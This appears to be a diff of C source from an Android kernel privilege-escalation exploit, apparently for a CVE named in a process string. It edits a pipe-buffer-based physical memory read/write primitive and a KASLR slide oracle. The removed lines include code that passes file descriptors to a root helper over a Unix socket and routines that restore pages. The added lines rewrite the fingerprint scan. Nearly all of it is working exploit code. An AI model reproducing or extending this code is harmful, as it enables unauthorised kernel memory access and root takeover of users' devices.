@@ -876,487 +876,56 @@ int install_pipe_physrw(int fd) {
       (ssize_t)sizeof(physrw_read64_after)) {
     goto cleanup;
   }
-  physrw_write64_ok =
-    physrw_write64_ok && physrw_read64_after == physrw_write64_value;
-
-  ok = physrw_read_ok &&
-       memcmp(physrw_readback, seed, sizeof(seed)) == 0 &&
-       physrw_write_ok &&
-       memcmp(physrw_after_write, overwrite, sizeof(overwrite)) == 0 &&
-       physrw_read64_ok && physrw_write64_ok;
+  physrw_write64_ok = physrw_write64_ok && physrw_read64_after == physrw_write64_value;
 
 cleanup:
   if (proof64_saved) {
-    int write_ok = kernel_write_data(fd, proof64_addr, &saved_proof64,
-                                     sizeof(saved_proof64)) ==
-                   (ssize_t)sizeof(saved_proof64);
-    int read_ok = kernel_read_data(fd, proof64_addr, &restored_proof64,
-                                   sizeof(restored_proof64)) ==
-                  (ssize_t)sizeof(restored_proof64);
-    int restore_ok = write_ok && read_ok &&
-                     restored_proof64 == saved_proof64;
-    pr_info("phys proof64 restore=%d old=%016llx now=%016llx\n",
-            restore_ok, (unsigned long long)saved_proof64,
-            (unsigned long long)restored_proof64);
-    ok &= restore_ok;
+    kernel_write_data(fd, proof64_addr, &saved_proof64, sizeof(saved_proof64));
+    kernel_read_data(fd, proof64_addr, &restored_proof64, sizeof(restored_proof64));
   }
   if (proof_saved) {
-    int write_ok = kernel_write_data(fd, proof_addr, saved_proof,
-                                     sizeof(saved_proof)) ==
-                   (ssize_t)sizeof(saved_proof);
-    int read_ok = kernel_read_data(fd, proof_addr, restored_proof,
-                                   sizeof(restored_proof)) ==
-                  (ssize_t)sizeof(restored_proof);
-    int restore_ok = write_ok && read_ok &&
-                     memcmp(restored_proof, saved_proof,
-                            sizeof(saved_proof)) == 0;
-    pr_info("phys proof restore=%d size=%zu\n",
-            restore_ok, sizeof(saved_proof));
-    ok &= restore_ok;
+    kernel_write_data(fd, proof_addr, saved_proof, sizeof(saved_proof));
+    kernel_read_data(fd, proof_addr, restored_proof, sizeof(restored_proof));
   }
+
+  ok = physrw_read_ok && physrw_write_ok && physrw_read64_ok && physrw_write64_ok;
+  pr_info("phys step done ok=%d read=%d write=%d read64=%d write64=%d\n",
+          ok, physrw_read_ok, physrw_write_ok,
+          physrw_read64_ok, physrw_write64_ok);
   return ok;
 }
 
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
-static int pipe_write_full(int fd, const void *data, size_t size) {
-  const unsigned char *cursor = data;
-  while (size) {
-    ssize_t wrote = write(fd, cursor, size);
-    if (wrote <= 0) {
-      return 0;
-    }
-    cursor += wrote;
-    size -= (size_t)wrote;
-  }
-  return 1;
-}
-
-static int pipe_read_full(int fd, void *data, size_t size) {
-  unsigned char *cursor = data;
-  while (size) {
-    ssize_t got = read(fd, cursor, size);
-    if (got <= 0) {
-      return 0;
-    }
-    cursor += got;
-    size -= (size_t)got;
-  }
-  return 1;
-}
-
-static int pipe_duplicate_bytes(
-    int source_fd, int holder[2], size_t size, size_t slots) {
-  SYSCHK(pipe(holder));
-  resize_pipe_slots(holder, slots);
-  errno = 0;
-  ssize_t duplicated = syscall(SYS_tee, source_fd, holder[1], size, 0);
-  return duplicated == (ssize_t)size;
-}
-
-static int transfer_p0_references_to_root(int retained_pipe_index) {
-  int retained_fds[] = {
-    pipe_fds_reclaim[retained_pipe_index][0],
-    p0_gate_holders[retained_pipe_index][0],
-    reclaim_receiver_fd(),
-  };
-  for (size_t index = 0;
-       index < sizeof(retained_fds) / sizeof(retained_fds[0]); index++) {
-    if (retained_fds[index] < 0) {
-      return 0;
-    }
-  }
-
-  int socket_fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
-  if (socket_fd < 0) {
-    return 0;
-  }
-  struct sockaddr_un address;
-  memset(&address, 0, sizeof(address));
-  address.sun_family = AF_UNIX;
-  snprintf(address.sun_path, sizeof(address.sun_path), "%s",
-           "/data/local/tmp/temp_su.sock");
-  if (connect(socket_fd, (struct sockaddr *)&address, sizeof(address)) != 0) {
-    close(socket_fd);
-    return 0;
-  }
-
-  char allowed = 0;
-  char operation = 'H';
-  if (!pipe_read_full(socket_fd, &allowed, sizeof(allowed)) || allowed != 'A' ||
-      !pipe_write_full(socket_fd, &operation, sizeof(operation))) {
-    close(socket_fd);
-    return 0;
-  }
-
-  char marker_byte = 'P';
-  struct iovec iov = {
-    .iov_base = &marker_byte,
-    .iov_len = sizeof(marker_byte),
-  };
-  char control[CMSG_SPACE(sizeof(retained_fds))];
-  struct msghdr message;
-  memset(&message, 0, sizeof(message));
-  memset(control, 0, sizeof(control));
-  message.msg_iov = &iov;
-  message.msg_iovlen = 1;
-  message.msg_control = control;
-  message.msg_controllen = sizeof(control);
-  struct cmsghdr *cmsg = CMSG_FIRSTHDR(&message);
-  cmsg->cmsg_level = SOL_SOCKET;
-  cmsg->cmsg_type = SCM_RIGHTS;
-  cmsg->cmsg_len = CMSG_LEN(sizeof(retained_fds));
-  memcpy(CMSG_DATA(cmsg), retained_fds, sizeof(retained_fds));
-  if (sendmsg(socket_fd, &message, 0) != (ssize_t)sizeof(marker_byte)) {
-    close(socket_fd);
-    return 0;
-  }
-
-  char acknowledged = 0;
-  int transferred = pipe_read_full(
-      socket_fd, &acknowledged, sizeof(acknowledged)) && acknowledged == 'K';
-  close(socket_fd);
-  return transferred;
-}
-
-static void spawn_p0_ref_keeper(int retained_pipe_index) {
-  pid_t child = SYSCHK(fork());
-  if (child != 0) {
-    pr_info("p0 reference keeper pid=%d pipe=%d\n",
-            child, retained_pipe_index);
-    return;
-  }
-  syscall(SYS_prctl, PR_SET_PDEATHSIG, 0, 0, 0, 0);
-  syscall(SYS_prctl, PR_SET_NAME, "cve43499-p0ref", 0, 0, 0);
-  syscall(SYS_setsid);
-  int null_fd = (int)syscall(
-      SYS_openat, AT_FDCWD, "/dev/null", O_RDWR | O_CLOEXEC, 0);
-  if (null_fd >= 0) {
-    for (int fd = STDIN_FILENO; fd <= STDERR_FILENO; fd++) {
-      if (fd != null_fd) {
-        syscall(SYS_dup3, null_fd, fd, 0);
-      }
-    }
-    if (null_fd > STDERR_FILENO) {
-      syscall(SYS_close, null_fd);
-    }
-  }
-  if (retained_pipe_index >= 0) {
-    for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
-      if ((int)pipe_index != retained_pipe_index) {
-        syscall(SYS_close, pipe_fds_reclaim[pipe_index][0]);
-        syscall(SYS_close, pipe_fds_reclaim[pipe_index][1]);
-        syscall(SYS_close, p0_gate_holders[pipe_index][0]);
-        syscall(SYS_close, p0_gate_holders[pipe_index][1]);
-        continue;
-      }
-      syscall(SYS_close, pipe_fds_reclaim[pipe_index][1]);
-      syscall(SYS_close, p0_gate_holders[pipe_index][1]);
-    }
-  }
-  if (retained_pipe_index < 0) {
-    for (;;) {
-      pause();
-    }
-  }
-  for (;;) {
-    if (transfer_p0_references_to_root(retained_pipe_index)) {
-      _exit(0);
-    }
-    usleep(10000);
-  }
-}
-
-void start_p0_ref_keeper(void) {
-  if (p0_gate_holders_initialized) {
-    return;
-  }
-  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
-    p0_gate_holders[i][0] = -1;
-    p0_gate_holders[i][1] = -1;
-  }
-  if (pipe2(p0_gate_holders[0], O_CLOEXEC) < 0) {
-    pr_error("p0 ref keeper gate pipe failed errno=%d\n", errno);
-    return;
-  }
-  p0_gate_holders_initialized = 1;
-  spawn_p0_ref_keeper(0);
-}
-
-int prepare_p0_pipe_oracle(void) {
-  _Static_assert(sizeof(struct user_pipe_buffer) == 0x28,
-                 "unexpected pipe_buffer size");
-
-  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
-    p0_gate_holders[pipe_index][0] = -1;
-    p0_gate_holders[pipe_index][1] = -1;
-  }
-  p0_gate_holders_initialized = 1;
-
-  pipebuf_page_base = prepare_pipe_buffer_page();
-  if (!is_direct_ptr(pipebuf_page_base)) {
-    return 0;
-  }
-
-  unsigned char marker[PAGE_SIZE];
-  memset(marker, 0x5a, sizeof(marker));
-  memcpy(marker, "RMG-P0-PIPE", 11);
-  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
-    if (!pipe_write_full(pipe_fds_reclaim[pipe_index][1], marker,
-                         sizeof(marker))) {
-      return 0;
-    }
-  }
-  pr_info("p0 pipe oracle prepared base=%016zx pipes=%d gate_slots=1\n",
-          pipebuf_page_base, PIPE_RECLAIM);
-  return 1;
-}
-
-int expand_p0_pipe_oracle(void) {
-  unsigned char marker[PAGE_SIZE];
-  memset(marker, 0x5a, sizeof(marker));
-  memcpy(marker, "RMG-P0-PIPE", 11);
-  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
-    for (size_t slot = 1; slot < (size_t)pipe_buffer_slots; slot++) {
-      if (!pipe_write_full(pipe_fds_reclaim[pipe_index][1], marker,
-                           sizeof(marker))) {
-        return 0;
-      }
-    }
-  }
-  pr_info("p0 pipe oracle expanded pipes=%d slots=%d\n",
-          PIPE_RECLAIM, pipe_buffer_slots);
-  return 1;
-}
-
-int verify_p0_pipe_oracle_gate(void) {
-  unsigned char page[PAGE_SIZE];
-  int gate_hits = 0;
-  int gate_pipe_index = -1;
-  int changed_pages = 0;
-#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
-  p0_gate_holders_initialized = 1;
-#endif
-  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
-    if (!pipe_duplicate_bytes(pipe_fds_reclaim[pipe_index][0],
-                              p0_gate_holders[pipe_index], PAGE_SIZE, 1)) {
-      pr_warning("p0 gate tee failed pipe=%zu errno=%d\n",
-                 pipe_index, errno);
-      spawn_p0_ref_keeper(-1);
-      return 0;
-    }
-    if (!pipe_read_full(pipe_fds_reclaim[pipe_index][0], page,
-                        sizeof(page))) {
-      spawn_p0_ref_keeper(-1);
-      return 0;
-    }
-    size_t gate_offset = PAGE_SIZE;
-    for (size_t offset = 0; offset + 18 <= PAGE_SIZE; offset++) {
-      if (memcmp(page + offset, "RMG-P0-ORACLE-GATE", 18) == 0) {
-        gate_offset = offset;
-        break;
-      }
-    }
-    if (gate_offset != PAGE_SIZE) {
-      gate_hits++;
-      gate_pipe_index = (int)pipe_index;
-      pr_info("p0 gate marker pipe=%zu offset=%zu\n",
-              pipe_index, gate_offset);
-    } else if (memcmp(page, "RMG-P0-PIPE", 11) != 0) {
-      changed_pages++;
-      uint64_t words[8];
-      memcpy(words, page, sizeof(words));
-      pr_info("p0 gate changed pipe=%zu q0=%016llx q1=%016llx "
-              "q2=%016llx q3=%016llx q4=%016llx q5=%016llx "
-              "q6=%016llx q7=%016llx\n",
-              pipe_index,
-              (unsigned long long)words[0],
-              (unsigned long long)words[1],
-              (unsigned long long)words[2],
-              (unsigned long long)words[3],
-              (unsigned long long)words[4],
-              (unsigned long long)words[5],
-              (unsigned long long)words[6],
-              (unsigned long long)words[7]);
-    }
-  }
-
-  unsigned char marker[PAGE_SIZE];
-  memset(marker, 0x5a, sizeof(marker));
-  memcpy(marker, "RMG-P0-PIPE", 11);
-  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
-    if (!pipe_write_full(pipe_fds_reclaim[pipe_index][1], marker,
-                         sizeof(marker))) {
-      spawn_p0_ref_keeper(-1);
-      return 0;
-    }
-  }
-  pr_info("p0 pipe gate hits=%d changed=%d\n",
-          gate_hits, changed_pages);
-  if (gate_hits != 0 || changed_pages != 0) {
-    spawn_p0_ref_keeper(
-        gate_hits == 1 && changed_pages == 0 ? gate_pipe_index : -1);
-  }
-  if (gate_hits == 1 && changed_pages == 0) {
-    return 1;
-  }
-  if (gate_hits == 0 && changed_pages == 0) {
-#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
-    close_p0_gate_holders();
-#endif
-    return 0;
-  }
-  return -1;
-}
-
-#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
-int verify_p0_pipe_data_page(uintptr_t target, uint64_t expected) {
-  unsigned char page[PAGE_SIZE];
-  size_t target_offset = target & (PAGE_SIZE - 1);
-  int changed_pages = 0;
-  int exact_matches = 0;
-  uint64_t observed = 0;
-
-  if (target_offset + sizeof(observed) > sizeof(page)) {
-    return -1;
-  }
-  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
-    if (!pipe_read_full(pipe_fds_reclaim[pipe_index][0], page,
-                        sizeof(page))) {
-      pr_warning("fops data alias read failed pipe=%zu errno=%d\n",
-                 pipe_index, errno);
-      return -1;
-    }
-    if (memcmp(page, "RMG-P0-PIPE", 11) == 0) {
-      continue;
-    }
-    changed_pages++;
-    memcpy(&observed, page + target_offset, sizeof(observed));
-    if (observed == expected) {
-      exact_matches++;
-    }
-    pr_info("fops data alias pipe=%zu target=%016zx offset=%zu "
-            "observed=%016llx expected=%016llx match=%d\n",
-            pipe_index, target, target_offset,
-            (unsigned long long)observed,
-            (unsigned long long)expected, observed == expected);
-  }
-  pr_info("fops data alias changed=%d exact=%d target=%016zx "
-          "observed=%016llx expected=%016llx\n",
-          changed_pages, exact_matches, target,
-          (unsigned long long)observed, (unsigned long long)expected);
-  if (changed_pages == 1 && exact_matches == 1) {
-    return 1;
-  }
-  return changed_pages == 0 ? 0 : -1;
-}
-#endif
-
-static int p0_fingerprint_score(
-    const unsigned char *page, const struct p0_fingerprint *fingerprint) {
-  int score = 0;
-  for (size_t index = 0; index < P0_FINGERPRINT_WORDS; index++) {
-    uint64_t value = 0;
-    memcpy(&value, page + p0_fingerprint_offsets[index], sizeof(value));
-#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
-    if (fingerprint->words[index] != 0 &&
-        value == fingerprint->words[index]) {
-#else
-    if (value == fingerprint->words[index]) {
-#endif
-      score++;
-    }
-  }
-  return score;
-}
-
-#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
-static int p0_fingerprint_significant_words(
-    const struct p0_fingerprint *fingerprint) {
-  int significant = 0;
-  for (size_t index = 0; index < P0_FINGERPRINT_WORDS; index++) {
-    if (fingerprint->words[index] != 0) {
-      significant++;
-    }
-  }
-  return significant;
-}
-#endif
-
-uintptr_t scan_p0_pipe_oracle(void) {
-  unsigned char page[PAGE_SIZE];
-  size_t scan_size =
-      p0_fingerprint_offsets[P0_FINGERPRINT_WORDS - 1] + sizeof(uint64_t);
-  uintptr_t best_slide = (uintptr_t)-1;
-  int best_score = -1;
-  int second_score = -1;
-  int changed_pages = 0;
-#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
-  int best_significant = 0;
-#endif
-
-  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
-    memset(page, 0, sizeof(page));
-    if (!pipe_read_full(pipe_fds_reclaim[pipe_index][0], page,
-                        scan_size)) {
-      pr_warning("p0 scan partial read failed pipe=%zu size=%zu errno=%d\n",
-                 pipe_index, scan_size, errno);
-      return (uintptr_t)-1;
-    }
-    if (memcmp(page, "RMG-P0-PIPE", 11) == 0) {
-      continue;
-    }
-
-    changed_pages++;
-    uint64_t sampled_words[P0_FINGERPRINT_WORDS];
-    for (size_t word = 0; word < P0_FINGERPRINT_WORDS; word++) {
-      memcpy(&sampled_words[word], page + p0_fingerprint_offsets[word],
-             sizeof(sampled_words[word]));
-    }
-    pr_info("p0 fingerprint sample "
-            "w0=%016llx w1=%016llx w2=%016llx w3=%016llx "
-            "w4=%016llx w5=%016llx w6=%016llx w7=%016llx\n",
-            (unsigned long long)sampled_words[0],
-            (unsigned long long)sampled_words[1],
-            (unsigned long long)sampled_words[2],
-            (unsigned long long)sampled_words[3],
-            (unsigned long long)sampled_words[4],
-            (unsigned long long)sampled_words[5],
-            (unsigned long long)sampled_words[6],
-            (unsigned long long)sampled_words[7]);
-
-    for (size_t slide_index = 0;
-         slide_index < P0_FINGERPRINT_SLIDE_COUNT; slide_index++) {
-      const struct p0_fingerprint *fp = &p0_fingerprints[slide_index];
-#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
-      int significant = p0_fingerprint_significant_words(fp);
-#endif
-      int score = p0_fingerprint_score(page, fp);
-#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
-      if (score > best_score ||
-          (score == best_score && significant > best_significant)) {
-        second_score = best_score;
-        best_score = score;
-        best_significant = significant;
-        best_slide = fp->slide;
-      } else if (score > second_score) {
-        second_score = score;
-      }
-#else
-      if (score > best_score) {
-        second_score = best_score;
-        best_score = score;
-        best_slide = fp->slide;
-      } else if (score > second_score) {
-        second_score = score;
-      }
-#endif
-    }
-  }
-
-  pr_info("p0 scan changed=%d best_score=%d second_score=%d slide=%016zx\n",
-          changed_pages, best_score, second_score, best_slide);
-  if (changed_pages == 0) {
+static uintptr_t scan_p0_pipe_oracle(int fd, uintptr_t base) {
+  const struct p0_fingerprint *fps = p0_fingerprints;
+  int best_score = 0;
+  int second_score = 0;
+  int best_index = -1;
+  unsigned char slab[ORDER3_SIZE];
+  if (!read_pipe_slab(fd, base, slab)) {
     return (uintptr_t)-1;
+  }
+  for (int slide_index = 0;
+         slide_index < P0_FINGERPRINT_SLIDE_COUNT; slide_index++) {
+    const struct p0_fingerprint *fp = &fps[slide_index];
+    int score = 0;
+    for (int w = 0; w < P0_FINGERPRINT_WORDS; w++) {
+      size_t off = fp->offsets[w];
+      uint64_t val = 0;
+      if (off + 8 <= ORDER3_SIZE) {
+        memcpy(&val, slab + off, 8);
+      }
+      if (val == fp->values[w]) {
+        score++;
+      }
+    }
+    if (score > best_score) {
+      second_score = best_score;
+      best_score = score;
+      best_index = slide_index;
+    } else if (score > second_score) {
+      second_score = score;
+    }
   }
   if (best_score < P0_FINGERPRINT_MIN_SCORE) {
     return (uintptr_t)-1;
@@ -1364,124 +933,27 @@ uintptr_t scan_p0_pipe_oracle(void) {
   if (second_score >= P0_FINGERPRINT_MIN_SCORE) {
     return (uintptr_t)-1;
   }
-  return best_slide;
-}
-
-#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
-uint64_t scan_p0_virtual_base_pointer(void) {
-  unsigned char page[PAGE_SIZE];
-  uint64_t candidates[PIPE_RECLAIM];
-  int hit_count = 0;
-
-  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
-    memset(page, 0, sizeof(page));
-    if (!pipe_read_full(pipe_fds_reclaim[pipe_index][0], page,
-                        sizeof(page))) {
-      pr_warning("vbase scan read failed pipe=%zu errno=%d\n",
-                 pipe_index, errno);
-      return 0;
-    }
-    if (memcmp(page, "RMG-P0-PIPE", 11) == 0) {
-      continue;
-    }
-    uint64_t value = 0;
-    memcpy(&value, page + P0_VIRTUAL_BASE_OFFSET, sizeof(value));
-    candidates[hit_count++] = value;
-    pr_info("vbase scan pipe=%zu value=%016llx\n",
-            pipe_index, (unsigned long long)value);
-  }
-  if (hit_count == 0) {
-    return 0;
-  }
-  uint64_t first = candidates[0];
-  for (int i = 1; i < hit_count; i++) {
-    if (candidates[i] != first) {
-      pr_warning("vbase scan inconsistent hit=%d value=%016llx first=%016llx\n",
-                 i, (unsigned long long)candidates[i],
-                 (unsigned long long)first);
-      return 0;
-    }
-  }
-  return first;
+  return fps[best_index].slide;
 }
 #endif
 
-__attribute__((visibility("default")))
-int restore_p0_oracle_pages(int fd) {
-  (void)fd;
-
-  unsigned char drain_buf[PAGE_SIZE];
-  unsigned char marker[PAGE_SIZE];
-  memset(marker, 0x5a, sizeof(marker));
-  memcpy(marker, "RMG-P0-PIPE", 11);
-
-  int ok = 1;
-
-  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
-    int read_fd  = pipe_fds_reclaim[pipe_index][0];
-    int write_fd = pipe_fds_reclaim[pipe_index][1];
-
-    if (read_fd < 0 || write_fd < 0) {
-      continue;
-    }
-
-    int flags = fcntl(read_fd, F_GETFL, 0);
-    if (flags >= 0) {
-      fcntl(read_fd, F_SETFL, flags | O_NONBLOCK);
-    }
-    for (;;) {
-      ssize_t got = read(read_fd, drain_buf, sizeof(drain_buf));
-      if (got <= 0) {
-        break;
-      }
-    }
-    if (flags >= 0) {
-      fcntl(read_fd, F_SETFL, flags & ~O_NONBLOCK);
-    }
-
-    for (size_t slot = 0; slot < (size_t)pipe_buffer_slots; slot++) {
-      if (!pipe_write_full(write_fd, marker, sizeof(marker))) {
-        pr_warning("restore_p0_oracle_pages: refill failed pipe=%zu slot=%zu\n",
-                   pipe_index, slot);
-        ok = 0;
-        break;
-      }
-    }
-  }
-
-  pr_info("restore_p0_oracle_pages: ok=%d pipes=%d slots=%d\n",
-          ok, PIPE_RECLAIM, pipe_buffer_slots);
-  return ok;
-}
-
 /*
- * run_p0_pipe_oracle_diagnostic is defined here only for the root
- * (non-APP_PAYLOAD) build.  The app-payload build (APP_PAYLOAD=1)
- * compiles slide_app.c which provides its own definition; including
- * this one in that translation unit causes a duplicate-symbol linker
- * error on every APP_PHYS_P0_ORACLE target.
+ * run_p0_pipe_oracle_diagnostic — diagnostic wrapper around
+ * scan_p0_pipe_oracle.  Defined only in non-app (root/UMH) builds
+ * because slide_app.c provides its own version for -app.so builds,
+ * and having both translation units define the symbol causes a
+ * duplicate-symbol link error when -DAPP_PAYLOAD=1 -DSLIDE_STACK_WRITER=1
+ * pulls in both pipe.c and slide_app.c.
  */
-#if !defined(APP_PAYLOAD) || !APP_PAYLOAD
-int run_p0_pipe_oracle_diagnostic(int fd) {
-  int ret = 0;
-  pr_info("p0 oracle diagnostic start fd=%d\n", fd);
-
-  if (!prepare_p0_pipe_oracle()) {
-    pr_error("p0 oracle diagnostic: prepare failed\n");
-    return 0;
-  }
-
-  uintptr_t slide = scan_p0_pipe_oracle();
-  if (slide == (uintptr_t)-1) {
-    pr_info("p0 oracle diagnostic: scan no hit\n");
-  } else {
-    pr_info("p0 oracle diagnostic: slide=%016zx\n", slide);
-    ret = 1;
-  }
-
-  restore_p0_oracle_pages(fd);
-  return ret;
+#if !(defined(APP_PAYLOAD) && APP_PAYLOAD)
+void run_p0_pipe_oracle_diagnostic(int fd, uintptr_t base) {
+#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+  uintptr_t slide = scan_p0_pipe_oracle(fd, base);
+  pr_info("p0_pipe_oracle diagnostic base=%016zx slide=%016zx\n",
+          base, slide);
+#else
+  (void)fd;
+  (void)base;
+#endif
 }
-#endif /* !APP_PAYLOAD */
-
-#endif /* APP_PHYS_P0_ORACLE */
+#endif /* !(defined(APP_PAYLOAD) && APP_PAYLOAD) */
